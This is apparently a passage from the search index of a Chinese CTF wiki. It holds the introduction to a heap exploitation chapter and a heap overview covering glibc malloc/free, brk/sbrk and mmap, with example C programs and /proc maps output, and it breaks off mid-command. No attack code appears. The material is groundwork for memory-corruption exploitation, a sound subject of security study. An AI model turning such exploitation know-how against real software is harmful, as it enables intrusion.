            "text": "\u5806\u5229\u7528\n\n\n\u5728\u8be5\u7ae0\u8282\u4e2d\uff0c\u6211\u4eec\u4f1a\u6309\u7167\u5982\u4e0b\u7684\u6b65\u9aa4\u8fdb\u884c\u4ecb\u7ecd\n\n\n\n\n\u4ecb\u7ecd\u6211\u4eec\u6240\u719f\u77e5\u7684\u52a8\u6001\u5185\u5b58\u5206\u914d\u7684\u5806\u7684\u5b8f\u89c2\u64cd\u4f5c\n\n\n\u4ecb\u7ecd\u4e3a\u4e86\u8fbe\u5230\u8fd9\u4e9b\u64cd\u4f5c\u6240\u4f7f\u7528\u7684\u6570\u636e\u7ed3\u6784\n\n\n\u4ecb\u7ecd\u5229\u7528\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u5b9e\u73b0\u5806\u7684\u5206\u914d\u4e0e\u56de\u6536\u7684\u5177\u4f53\u64cd\u4f5c\n\n\n\u7531\u6d45\u5165\u6df1\u5730\u4ecb\u7ecd\u5806\u7684\u5404\u79cd\u5229\u7528\u6280\u5de7\u3002\n\n\n\n\n\u5bf9\u4e8e\u4e0d\u540c\u7684\u5e94\u7528\u6765\u8bf4\uff0c\u7531\u4e8e\u5185\u5b58\u7684\u9700\u6c42\u5404\u4e0d\u76f8\u540c\u7b49\u7279\u6027\uff0c\u56e0\u6b64\u76ee\u524d\u5806\u7684\u5b9e\u73b0\u6709\u5f88\u591a\u79cd\uff0c\u5177\u4f53\u5982\u4e0b\n\n\ndlmalloc  \u2013 General purpose allocator\nptmalloc2 \u2013 glibc\njemalloc  \u2013 FreeBSD and Firefox\ntcmalloc  \u2013 Google\nlibumem   \u2013 Solaris\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ee5 glibc \u4e2d\u5806\u7684\u5b9e\u73b0\u4e3a\u4e3b\u8fdb\u884c\u4ecb\u7ecd\u3002\u5982\u679c\u540e\u7eed\u6709\u65f6\u95f4\uff0c\u4f1a\u7ee7\u7eed\u4ecb\u7ecd\u5176\u5b83\u5806\u7684\u5b9e\u73b0\u53ca\u5176\u5229\u7528\u3002\n\n\n\u8be5\u90e8\u5206\u4e3b\u8981\u53c2\u8003\u7684\u8d44\u6599\u5982\u4e0b\uff0c\u6587\u4e2d\u6709\u5f88\u591a\u5185\u5bb9\u4f1a\u548c\u53c2\u8003\u8d44\u6599\u4e2d\u4e00\u81f4\uff0c\u4ee5\u540e\u5c31\u4e0d\u4e00\u4e00\u8bf4\u660e\u4e86\u3002\n\n\n\n\nblack hat heap exploitation\n\n\ngithub heap exploition\n\n\nsploitfun\n\n\nglibc \u6e90\u7801\n\n\n\u66f4\u591a\u7684\u53c2\u8003\u6587\u732e\u8bf7\u770bref\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6", 
            "title": "\u5806\u5229\u7528\u7b80\u4ecb"
        }, 
        {
            "location": "/pwn/heap/introduction/#_1", 
            "text": "\u5728\u8be5\u7ae0\u8282\u4e2d\uff0c\u6211\u4eec\u4f1a\u6309\u7167\u5982\u4e0b\u7684\u6b65\u9aa4\u8fdb\u884c\u4ecb\u7ecd   \u4ecb\u7ecd\u6211\u4eec\u6240\u719f\u77e5\u7684\u52a8\u6001\u5185\u5b58\u5206\u914d\u7684\u5806\u7684\u5b8f\u89c2\u64cd\u4f5c  \u4ecb\u7ecd\u4e3a\u4e86\u8fbe\u5230\u8fd9\u4e9b\u64cd\u4f5c\u6240\u4f7f\u7528\u7684\u6570\u636e\u7ed3\u6784  \u4ecb\u7ecd\u5229\u7528\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u5b9e\u73b0\u5806\u7684\u5206\u914d\u4e0e\u56de\u6536\u7684\u5177\u4f53\u64cd\u4f5c  \u7531\u6d45\u5165\u6df1\u5730\u4ecb\u7ecd\u5806\u7684\u5404\u79cd\u5229\u7528\u6280\u5de7\u3002   \u5bf9\u4e8e\u4e0d\u540c\u7684\u5e94\u7528\u6765\u8bf4\uff0c\u7531\u4e8e\u5185\u5b58\u7684\u9700\u6c42\u5404\u4e0d\u76f8\u540c\u7b49\u7279\u6027\uff0c\u56e0\u6b64\u76ee\u524d\u5806\u7684\u5b9e\u73b0\u6709\u5f88\u591a\u79cd\uff0c\u5177\u4f53\u5982\u4e0b  dlmalloc  \u2013 General purpose allocator\nptmalloc2 \u2013 glibc\njemalloc  \u2013 FreeBSD and Firefox\ntcmalloc  \u2013 Google\nlibumem   \u2013 Solaris  \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ee5 glibc \u4e2d\u5806\u7684\u5b9e\u73b0\u4e3a\u4e3b\u8fdb\u884c\u4ecb\u7ecd\u3002\u5982\u679c\u540e\u7eed\u6709\u65f6\u95f4\uff0c\u4f1a\u7ee7\u7eed\u4ecb\u7ecd\u5176\u5b83\u5806\u7684\u5b9e\u73b0\u53ca\u5176\u5229\u7528\u3002  \u8be5\u90e8\u5206\u4e3b\u8981\u53c2\u8003\u7684\u8d44\u6599\u5982\u4e0b\uff0c\u6587\u4e2d\u6709\u5f88\u591a\u5185\u5bb9\u4f1a\u548c\u53c2\u8003\u8d44\u6599\u4e2d\u4e00\u81f4\uff0c\u4ee5\u540e\u5c31\u4e0d\u4e00\u4e00\u8bf4\u660e\u4e86\u3002   black hat heap exploitation  github heap exploition  sploitfun  glibc \u6e90\u7801  \u66f4\u591a\u7684\u53c2\u8003\u6587\u732e\u8bf7\u770bref\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6", 
            "title": "\u5806\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/heap_overview/", 
            "text": "\u5806\u6982\u8ff0\n\n\n\u4ec0\u4e48\u662f\u5806\n\n\n\u5728\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u5806\u53ef\u4ee5\u63d0\u4f9b\u52a8\u6001\u5206\u914d\u7684\u5185\u5b58\uff0c\u5141\u8bb8\u7a0b\u5e8f\u7533\u8bf7\u5927\u5c0f\u672a\u77e5\u7684\u5185\u5b58\u3002\u5806\u5176\u5b9e\u5c31\u662f\u7a0b\u5e8f\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u4e00\u5757\u8fde\u7eed\u7684\u7ebf\u6027\u533a\u57df\uff0c\u5b83\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u65b9\u5411\u589e\u957f\u3002\u6211\u4eec\u4e00\u822c\u79f0\u7ba1\u7406\u5806\u7684\u90a3\u90e8\u5206\u7a0b\u5e8f\u4e3a\u5806\u7ba1\u7406\u5668\u3002\n\n\n\u5806\u7ba1\u7406\u5668\u5904\u4e8e\u7528\u6237\u7a0b\u5e8f\u4e0e\u5185\u6838\u4e2d\u95f4\uff0c\u4e3b\u8981\u505a\u4ee5\u4e0b\u5de5\u4f5c\n\n\n\n\n\u54cd\u5e94\u7528\u6237\u7684\u7533\u8bf7\u5185\u5b58\u8bf7\u6c42\uff0c\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\uff0c\u7136\u540e\u5c06\u5176\u8fd4\u56de\u7ed9\u7528\u6237\u7a0b\u5e8f\u3002\u540c\u65f6\uff0c\u4e3a\u4e86\u4fdd\u6301\u5185\u5b58\u7ba1\u7406\u7684\u9ad8\u6548\u6027\uff0c\u5185\u6838\u4e00\u822c\u90fd\u4f1a\u9884\u5148\u5206\u914d\u5f88\u5927\u7684\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\uff0c\u7136\u540e\u8ba9\u5806\u7ba1\u7406\u5668\u901a\u8fc7\u67d0\u79cd\u7b97\u6cd5\u7ba1\u7406\u8fd9\u5757\u5185\u5b58\u3002\u53ea\u6709\u5f53\u51fa\u73b0\u4e86\u5806\u7a7a\u95f4\u4e0d\u8db3\u7684\u60c5\u51b5\uff0c\u5806\u7ba1\u7406\u5668\u624d\u4f1a\u518d\u6b21\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\u3002\n\n\n\u7ba1\u7406\u7528\u6237\u6240\u91ca\u653e\u7684\u5185\u5b58\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u7528\u6237\u91ca\u653e\u7684\u5185\u5b58\u5e76\u4e0d\u662f\u76f4\u63a5\u8fd4\u8fd8\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u7684\uff0c\u800c\u662f\u7531\u5806\u7ba1\u7406\u5668\u8fdb\u884c\u7ba1\u7406\u3002\u8fd9\u4e9b\u91ca\u653e\u7684\u5185\u5b58\u53ef\u4ee5\u6765\u54cd\u5e94\u7528\u6237\u65b0\u7533\u8bf7\u7684\u5185\u5b58\u7684\u8bf7\u6c42\u3002\n\n\n\n\nLinux \u4e2d\u65e9\u671f\u7684\u5806\u5206\u914d\u4e0e\u56de\u6536\u7531 Doug Lea \u5b9e\u73b0\uff0c\u4f46\u5b83\u5728\u5e76\u884c\u5904\u7406\u591a\u4e2a\u7ebf\u7a0b\u65f6\uff0c\u4f1a\u5171\u4eab\u8fdb\u7a0b\u7684\u5806\u5185\u5b58\u7a7a\u95f4\u3002\u56e0\u6b64\uff0c\u4e3a\u4e86\u5b89\u5168\u6027\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u4f7f\u7528\u5806\u65f6\uff0c\u4f1a\u8fdb\u884c\u52a0\u9501\u3002\u7136\u800c\uff0c\u4e0e\u6b64\u540c\u65f6\uff0c\u52a0\u9501\u4f1a\u5bfc\u81f4\u5176\u5b83\u7ebf\u7a0b\u65e0\u6cd5\u4f7f\u7528\u5806\uff0c\u964d\u4f4e\u4e86\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u9ad8\u6548\u6027\u3002\u540c\u65f6\uff0c\u5982\u679c\u5728\u591a\u7ebf\u7a0b\u4f7f\u7528\u65f6\uff0c\u6ca1\u80fd\u6b63\u786e\u63a7\u5236\uff0c\u4e5f\u53ef\u80fd\u5f15\u8d77\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u6b63\u786e\u6027\u3002Wolfram Gloger \u5728 Doug Lea \u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u6539\u8fdb\u4f7f\u5176\u53ef\u4ee5\u652f\u6301\u591a\u7ebf\u7a0b\uff0c\u8fd9\u4e2a\u5806\u5206\u914d\u5668\u5c31\u662f ptmalloc \u3002\u5728 glibc-2.3.x. \u4e4b\u540e\uff0cglibc \u4e2d\u96c6\u6210\u4e86ptmalloc2\u3002\n\n\n\u76ee\u524d Linux \u6807\u51c6\u53d1\u884c\u7248\u4e2d\u4f7f\u7528\u7684\u5806\u5206\u914d\u5668\u662f glibc \u4e2d\u7684\u5806\u5206\u914d\u5668\uff1aptmalloc2\u3002ptmalloc2 \u4e3b\u8981\u662f\u901a\u8fc7 malloc/free \u51fd\u6570\u6765\u5206\u914d\u548c\u91ca\u653e\u5185\u5b58\u5757\u3002\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u5185\u5b58\u5206\u914d\u4e0e\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0cLinux\u6709\u8fd9\u6837\u7684\u4e00\u4e2a\u57fa\u672c\u5185\u5b58\u7ba1\u7406\u601d\u60f3\uff0c\n\u53ea\u6709\u5f53\u771f\u6b63\u8bbf\u95ee\u4e00\u4e2a\u5730\u5740\u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u624d\u4f1a\u5efa\u7acb\u865a\u62df\u9875\u9762\u4e0e\u7269\u7406\u9875\u9762\u7684\u6620\u5c04\u5173\u7cfb\n\u3002 \u6240\u4ee5\u867d\u7136\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u7ed9\u7a0b\u5e8f\u5206\u914d\u4e86\u5f88\u5927\u7684\u4e00\u5757\u5185\u5b58\uff0c\u4f46\u662f\u8fd9\u5757\u5185\u5b58\u5176\u5b9e\u53ea\u662f\u865a\u62df\u5185\u5b58\u3002\u53ea\u6709\u5f53\u7528\u6237\u4f7f\u7528\u5230\u76f8\u5e94\u7684\u5185\u5b58\u65f6\uff0c\u7cfb\u7edf\u624d\u4f1a\u771f\u6b63\u5206\u914d\u7269\u7406\u9875\u9762\u7ed9\u7528\u6237\u4f7f\u7528\u3002\n\n\n\u5806\u7684\u57fa\u672c\u64cd\u4f5c\n\n\n\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd\n\n\n\n\n\u57fa\u672c\u7684\u5806\u64cd\u4f5c\uff0c\u5305\u62ec\u5806\u7684\u5206\u914d\uff0c\u56de\u6536\uff0c\u5806\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528\n\n\n\u4ecb\u7ecd\u5806\u76ee\u524d\u7684\u591a\u7ebf\u7a0b\u652f\u6301\u3002\n\n\n\n\nmalloc\n\n\n\u5728 glibc \u7684\nmalloc.h\n\u4e2d\uff0cmalloc \u7684\u8bf4\u660e\u5982\u4e0b\n\n\n/*\n\n\n  malloc(size_t n)\n\n\n  Returns a pointer to a newly allocated chunk of at least n bytes, or null\n\n\n  if no space is available. Additionally, on failure, errno is\n\n\n  set to ENOMEM on ANSI C systems.\n\n\n  If n is zero, malloc returns a minumum-sized chunk. (The minimum\n\n\n  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit\n\n\n  systems.)  On most systems, size_t is an unsigned type, so calls\n\n\n  with negative arguments are interpreted as requests for huge amounts\n\n\n  of space, which will often fail. The maximum supported value of n\n\n\n  differs across systems, but is in all cases less than the maximum\n\n\n  representable value of a size_t.\n\n\n*/\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0cmalloc \u51fd\u6570\u8fd4\u56de\u5bf9\u5e94\u5927\u5c0f\u5b57\u8282\u7684\u5185\u5b58\u5757\u7684\u6307\u9488\u3002\u6b64\u5916\uff0c\u8be5\u51fd\u6570\u8fd8\u5bf9\u4e00\u4e9b\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406\n\n\n\n\n\u5f53 n=0 \u65f6\uff0c\u8fd4\u56de\u5f53\u524d\u7cfb\u7edf\u5141\u8bb8\u7684\u5806\u7684\u6700\u5c0f\u5185\u5b58\u5757\u3002\n\n\n\u5f53 n \u4e3a\u8d1f\u6570\u65f6\uff0c\u7531\u4e8e\u5728\u5927\u591a\u6570\u7cfb\u7edf\u4e0a\uff0c\nsize_t \u662f\u65e0\u7b26\u53f7\u6570\uff08\u8fd9\u4e00\u70b9\u975e\u5e38\u91cd\u8981\uff09\n\uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u4f1a\u7533\u8bf7\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u4f46\u901a\u5e38\u6765\u8bf4\u90fd\u4f1a\u5d29\u6e83\uff0c\u56e0\u4e3a\u7cfb\u7edf\u6ca1\u6709\u90a3\u4e48\u591a\u7684\u5185\u5b58\u53ef\u4ee5\u5206\u914d\u3002\n\n\n\n\nfree\n\n\n\u5728 glibc \u7684 \nmalloc.h\n \u4e2d\uff0cfree \u7684\u8bf4\u660e\u5982\u4e0b\n\n\n/*\n\n\n      free(void* p)\n\n\n      Releases the chunk of memory pointed to by p, that had been previously\n\n\n      allocated using malloc or a related routine such as realloc.\n\n\n      It has no effect if p is null. It can have arbitrary (i.e., bad!)\n\n\n      effects if p has already been freed.\n\n\n      Unless disabled (using mallopt), freeing very large spaces will\n\n\n      when possible, automatically trigger operations that give\n\n\n      back unused memory to the system, thus reducing program footprint.\n\n\n    */\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0cfree \u51fd\u6570\u4f1a\u91ca\u653e\u7531 p \u6240\u6307\u5411\u7684\u5185\u5b58\u5757\u3002\u8fd9\u4e2a\u5185\u5b58\u5757\u6709\u53ef\u80fd\u662f\u901a\u8fc7 malloc \u51fd\u6570\u5f97\u5230\u7684\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u901a\u8fc7\u76f8\u5173\u7684\u51fd\u6570 realloc \u5f97\u5230\u7684\u3002\n\n\n\u6b64\u5916\uff0c\u8be5\u51fd\u6570\u4e5f\u540c\u6837\u5bf9\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406\n\n\n\n\n\u5f53 p \u4e3a\u7a7a\u6307\u9488\u65f6\uff0c\u51fd\u6570\u4e0d\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\u3002\n\n\n\u5f53 p \u5df2\u7ecf\u88ab\u91ca\u653e\u4e4b\u540e\uff0c\u518d\u6b21\u91ca\u653e\u4f1a\u51fa\u73b0\u4e71\u4e03\u516b\u7cdf\u7684\u6548\u679c\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f \ndouble free\n\u3002\n\n\n\u9664\u4e86\u88ab\u7981\u7528 (mallopt) \u7684\u60c5\u51b5\u4e0b\uff0c\u5f53\u91ca\u653e\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u5c06\u8fd9\u4e9b\u5185\u5b58\u7a7a\u95f4\u8fd8\u7ed9\u7cfb\u7edf\uff0c\u4ee5\u4fbf\u4e8e\u51cf\u5c0f\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u5185\u5b58\u7a7a\u95f4\u3002\n\n\n\n\n\u5185\u5b58\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528\n\n\n\u5728\u524d\u9762\u63d0\u5230\u7684\u51fd\u6570\u4e2d\uff0c\u65e0\u8bba\u662f malloc \u51fd\u6570\u8fd8\u662f free \u51fd\u6570\uff0c\u6211\u4eec\u52a8\u6001\u7533\u8bf7\u548c\u91ca\u653e\u5185\u5b58\u65f6\uff0c\u90fd\u7ecf\u5e38\u4f1a\u4f7f\u7528\uff0c\u4f46\u662f\u5b83\u4eec\u5e76\u4e0d\u662f\u771f\u6b63\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u7684\u51fd\u6570\u3002\u8fd9\u4e9b\u51fd\u6570\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528\u4e3b\u8981\u662f \n(s)brk\n \u51fd\u6570\u4ee5\u53ca \nmmap, munmap\n \u51fd\u6570\u3002\n\n\n\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u4e3b\u8981\u8003\u8651\u5bf9\u5806\u8fdb\u884c\u7533\u8bf7\u5185\u5b58\u5757\u7684\u64cd\u4f5c\u3002\n\n\n\n\n(s)brk\n\n\n\u5bf9\u4e8e\u5806\u7684\u64cd\u4f5c\uff0c\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86 brk \u51fd\u6570\uff0cglibc \u5e93\u63d0\u4f9b\u4e86 sbrk \u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0 \nbrk\n (program break location, the program break is the address of the first location beyond the current end of the data region, \nhttps://en.wikipedia.org/wiki/Sbrk)\u7684\u5927\u5c0f\u6765\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\n\u3002\n\n\n\u521d\u59cb\u65f6\uff0c\u5806\u7684\u8d77\u59cb\u5730\u5740 \nstart_brk\n \u4ee5\u53ca\u5806\u7684\u5f53\u524d\u672b\u5c3e \nbrk\n \u6307\u5411\u540c\u4e00\u5730\u5740\u3002\u6839\u636e\u662f\u5426\u5f00\u542fASLR\uff0c\u4e24\u8005\u7684\u5177\u4f53\u4f4d\u7f6e\u4f1a\u6709\u6240\u4e0d\u540c\n\n\n\n\n\u4e0d\u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4f1a\u6307\u5411 data/bss \u6bb5\u7684\u7ed3\u5c3e\u3002\n\n\n\u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4e5f\u4f1a\u6307\u5411\u540c\u4e00\u4f4d\u7f6e\uff0c\u53ea\u662f\u8fd9\u4e2a\u4f4d\u7f6e\u662f\u5728 data/bss \u6bb5\u7ed3\u5c3e\u540e\u7684\u968f\u673a\u504f\u79fb\u5904\u3002\n\n\n\n\n\u5177\u4f53\u6548\u679c\u5982\u4e0b\u56fe\uff08\u8fd9\u4e2a\u56fe\u7247\u4e0e\u7f51\u4e0a\u6d41\u4f20\u7684\u57fa\u672c\u4e00\u81f4\uff0c\u8fd9\u91cc\u662f\u56e0\u4e3a\u8981\u753b\u4e00\u5f20\u5927\u56fe\uff0c\u6240\u4ee5\u81ea\u5df1\u5355\u72ec\u753b\u4e86\u4e0b\uff09\u6240\u793a\n\n\n\n\n\u4f8b\u5b50\n\n\n/* sbrk and brk example */\n\n\n##include \nstdio.h\n\n\n##include \nunistd.h\n\n\n##include \nsys/types.h\n\n\n\nint\n \nmain\n()\n\n\n{\n\n        \nvoid\n \n*\ncurr_brk\n,\n \n*\ntmp_brk\n \n=\n \nNULL\n;\n\n\n        \nprintf\n(\nWelcome to sbrk example:%d\n\\n\n,\n \ngetpid\n());\n\n\n        \n/* sbrk(0) gives current program break location */\n\n        \ntmp_brk\n \n=\n \ncurr_brk\n \n=\n \nsbrk\n(\n0\n);\n\n        \nprintf\n(\nProgram Break Location1:%p\n\\n\n,\n \ncurr_brk\n);\n\n        \ngetchar\n();\n\n\n        \n/* brk(addr) increments/decrements program break location */\n\n        \nbrk\n(\ncurr_brk\n+\n4096\n);\n\n\n        \ncurr_brk\n \n=\n \nsbrk\n(\n0\n);\n\n        \nprintf\n(\nProgram break Location2:%p\n\\n\n,\n \ncurr_brk\n);\n\n        \ngetchar\n();\n\n\n        \nbrk\n(\ntmp_brk\n);\n\n\n        \ncurr_brk\n \n=\n \nsbrk\n(\n0\n);\n\n        \nprintf\n(\nProgram Break Location3:%p\n\\n\n,\n \ncurr_brk\n);\n\n        \ngetchar\n();\n\n\n        \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u6bcf\u4e00\u6b21\u6267\u884c\u5b8c\u64cd\u4f5c\u540e\uff0c\u90fd\u6267\u884c\u4e86getchar()\u51fd\u6570\uff0c\u8fd9\u662f\u4e3a\u4e86\u6211\u4eec\u65b9\u4fbf\u6211\u4eec\u67e5\u770b\u7a0b\u5e8f\u771f\u6b63\u7684\u6620\u5c04\u3002\n\n\n\u5728\u7b2c\u4e00\u6b21\u8c03\u7528brk\u4e4b\u524d\n\n\n\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5e76\u6ca1\u6709\u51fa\u73b0\u5806\u3002\u56e0\u6b64\n\n\n\n\nstart_brk = brk = end_data = 0x804b000\n\n\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk \nWelcome to sbrk example:6141\nProgram Break Location1:0x804b000\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps\n...\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539624\n     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk\nb7e21000-b7e22000 rw-p \n00000000\n \n00\n:00 \n0\n \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$\n\n\n\n\n\u7b2c\u4e00\u6b21\u589e\u52a0brk\u540e\n\n\n\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5df2\u7ecf\u51fa\u73b0\u4e86\u5806\u6bb5\n\n\n\n\nstart_brk = end_data = 0x804b000\n\n\nbrk = 0x804c000\n\n\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk \nWelcome to sbrk example:6141\nProgram Break Location1:0x804b000\nProgram Break Location2:0x804c000\n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps\n...\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539624\n     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk\n0804b000-0804c000 rw-p \n00000000\n \n00\n:00 \n0\n          \n[\nheap\n]\n\nb7e21000-b7e22000 rw-p \n00000000\n \n00\n:00 \n0\n \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$\n\n\n\n\n\u5176\u4e2d\uff0c\u5173\u4e8e\u5806\u7684\u90a3\u4e00\u884c\n\n\n\n\n0x0804b000 \u662f\u76f8\u5e94\u5806\u7684\u8d77\u59cb\u5730\u5740\n\n\nrw-p\u8868\u660e\u5806\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u5e76\u4e14\u5c5e\u4e8e\u9690\u79c1\u6570\u636e\u3002\n\n\n00000000 \u8868\u660e\u6587\u4ef6\u504f\u79fb\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a0\u3002\n\n\n00:00 \u662f\u4e3b\u4ece(Major/mirror)\u7684\u8bbe\u5907\u53f7\uff0c\u8fd9\u90e8\u5206\u5185\u5bb9\u4e5f\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e5f\u90fd\u4e3a0\u3002\n\n\n0\u8868\u793a\u7740Inode \u53f7\u3002\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a0\u3002\n\n\n\n\nmmap\n\n\nmalloc \u4f1a\u4f7f\u7528 \nmmap\n\u6765\u521b\u5efa\u72ec\u7acb\u7684\u533f\u540d\u6620\u5c04\u6bb5\u3002\u533f\u540d\u6620\u5c04\u7684\u76ee\u7684\u4e3b\u8981\u662f\u53ef\u4ee5\u7533\u8bf7\u4ee50\u586b\u5145\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u8fd9\u5757\u5185\u5b58\u4ec5\u88ab\u8c03\u7528\u8fdb\u7a0b\u6240\u4f7f\u7528\u3002\n\n\n\u4f8b\u5b50\n\n\n/* Private anonymous mapping example using mmap syscall */\n\n\n##include \nstdio.h\n\n\n##include \nsys/mman.h\n\n\n##include \nsys/types.h\n\n\n##include \nsys/stat.h\n\n\n##include \nfcntl.h\n\n\n##include \nunistd.h\n\n\n##include \nstdlib.h\n\n\n\nvoid\n \nstatic\n \ninline\n \nerrExit\n(\nconst\n \nchar\n*\n \nmsg\n)\n\n\n{\n\n        \nprintf\n(\n%s failed. Exiting the process\n\\n\n,\n \nmsg\n);\n\n        \nexit\n(\n-\n1\n);\n\n\n}\n\n\n\nint\n \nmain\n()\n\n\n{\n\n        \nint\n \nret\n \n=\n \n-\n1\n;\n\n        \nprintf\n(\nWelcome to private anonymous mapping example::PID:%d\n\\n\n,\n \ngetpid\n());\n\n        \nprintf\n(\nBefore mmap\n\\n\n);\n\n        \ngetchar\n();\n\n        \nchar\n*\n \naddr\n \n=\n \nNULL\n;\n\n        \naddr\n \n=\n \nmmap\n(\nNULL\n,\n \n(\nsize_t\n)\n132\n*\n1024\n,\n \nPROT_READ\n|\nPROT_WRITE\n,\n \nMAP_PRIVATE\n \n|\n \nMAP_ANONYMOUS\n,\n \n-\n1\n,\n \n0\n);\n\n        \nif\n \n(\naddr\n \n==\n \nMAP_FAILED\n)\n\n                \nerrExit\n(\nmmap\n);\n\n        \nprintf\n(\nAfter mmap\n\\n\n);\n\n        \ngetchar\n();\n\n\n        \n/* Unmap mapped region. */\n\n        \nret\n \n=\n \nmunmap\n(\naddr\n,\n \n(\nsize_t\n)\n132\n*\n1024\n);\n\n        \nif\n(\nret\n \n==\n \n-\n1\n)\n\n                \nerrExit\n(\nmunmap\n);\n\n        \nprintf\n(\nAfter munmap\n\\n\n);\n\n        \ngetchar\n();\n\n        \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u5728\u6267\u884cmmap\u4e4b\u524d\n\n\n\u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u76ee\u524d\u53ea\u6709.so\u6587\u4ef6\u7684mmap\u6bb5\u3002\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps\n\n08048000\n-08049000 r-xp \n00000000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n\n08049000\n-0804a000 r--p \n00000000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\n0804a000-0804b000 rw-p \n00001000\n \n08\n:01 \n539691\n     /home/sploitfun/ptmalloc.ppt/syscalls/mmap\nb7e21000-b7e22000 rw-p \n00000000\n \n00\n:00 \n0\n \n...\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$\n\n\n\n\nmmap\u540e\n\n\n\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7533\u8bf7\u7684\u5185\u5b58\u4e0e\u5df2\u7ecf\u5b58\u5728\u7684\u5185\u5b58\u6bb5\u7ed3\u5408\u5728\u4e86\u4e00\u8d77\u6784\u6210\u4e86b7e00000\u5230b7e21000\u7684mmap\u6bb5\u3002\n\n\nsploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat 